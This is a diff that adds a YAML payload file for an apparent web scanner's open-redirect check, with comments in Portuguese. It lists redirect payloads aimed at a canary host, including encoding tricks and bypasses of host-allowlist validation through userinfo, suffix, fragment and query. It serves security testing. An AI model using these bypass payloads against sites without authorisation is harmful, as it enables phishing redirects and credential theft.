@@ -1,0 +1,36 @@
+name: open_redirect
+description: Open Redirect (canário no header Location/Refresh) + bypass de validação de host
+detectors: [redirect, diff]
+diff_len_ratio: 0.60
+
+transforms:
+  - raw
+  - url
+  - backslash
+  - double_slash
+
+# o detector 'redirect' procura o canário 'phredir1337' no header Location/Refresh
+signatures: []
+
+payloads:
+  - { value: "https://phredir1337.oob/", tags: [absolute] }
+  - { value: "http://phredir1337.oob/", tags: [absolute] }
+  - { value: "//phredir1337.oob", tags: [schemeless] }
+  - { value: "//phredir1337.oob/", tags: [schemeless] }
+  - { value: "///phredir1337.oob", tags: [schemeless] }
+  - { value: "////phredir1337.oob", tags: [schemeless] }
+  - { value: "https:/phredir1337.oob", tags: [malformed] }
+  - { value: "https:phredir1337.oob", tags: [malformed] }
+  - { value: "/\\phredir1337.oob", tags: [backslash] }
+  - { value: "\\/\\/phredir1337.oob", tags: [backslash] }
+  - { value: "/%2f%2fphredir1337.oob", tags: [encoded] }
+  - { value: "/%09/phredir1337.oob", tags: [whitespace] }
+  - { value: "/%0d/phredir1337.oob", tags: [whitespace] }
+  - { value: "https://phredir1337.oob%2f%2e%2e", tags: [encoded] }
+  - { value: "//phredir1337.oob/%2f..", tags: [encoded] }
+  # --- bypass de validação "começa com dominio confiavel" ---
+  - { value: "https://trusted.com.phredir1337.oob/", tags: [bypass, suffix] }
+  - { value: "https://trusted.com@phredir1337.oob/", tags: [bypass, userinfo] }
+  - { value: "https://phredir1337.oob\\@trusted.com", tags: [bypass, userinfo] }
+  - { value: "https://phredir1337.oob#trusted.com", tags: [bypass, fragment] }
+  - { value: "https://phredir1337.oob?trusted.com", tags: [bypass, query] }
